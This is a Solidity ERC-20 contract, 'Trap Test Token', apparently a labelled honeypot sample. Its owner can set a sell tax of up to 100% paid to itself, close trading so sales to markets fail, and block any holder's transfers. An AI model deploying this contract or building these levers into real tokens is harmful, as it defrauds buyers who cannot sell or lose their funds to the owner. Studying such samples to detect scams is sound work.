// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// An ERC-20 with the classic honeypot levers held by a live owner.
contract TrapToken {
    string public constant name = "Trap Test Token";
    string public constant symbol = "TRAP";
    uint8 public constant decimals = 18;
    uint256 public immutable totalSupply;

    address public owner;
    bool public tradingOpen = true;
    uint256 public sellTaxBps;
    mapping(address => bool) public isMarket;
    mapping(address => bool) public blocked;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
        totalSupply = 1_000_000 * 1e18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setSellTax(uint256 bps) external onlyOwner {
        require(bps <= 10_000, "bps");
        sellTaxBps = bps;
    }

    function setTrading(bool open) external onlyOwner {
        tradingOpen = open;
    }

    function setBlocked(address account, bool isBlocked) external onlyOwner {
        blocked[account] = isBlocked;
    }

    function setMarket(address market, bool marketFlag) external onlyOwner {
        isMarket[market] = marketFlag;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _move(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }

    function _move(address from, address to, uint256 value) internal {
        require(!blocked[from], "blocked");
        require(balanceOf[from] >= value, "balance");
        uint256 received = value;
        if (from != owner && isMarket[to]) {
            require(tradingOpen, "trading closed");
            uint256 tax = (value * sellTaxBps) / 10_000;
            received = value - tax;
            balanceOf[owner] += tax;
            emit Transfer(from, owner, tax);
        }
        balanceOf[from] -= value;
        balanceOf[to] += received;
        emit Transfer(from, to, received);
    }
}
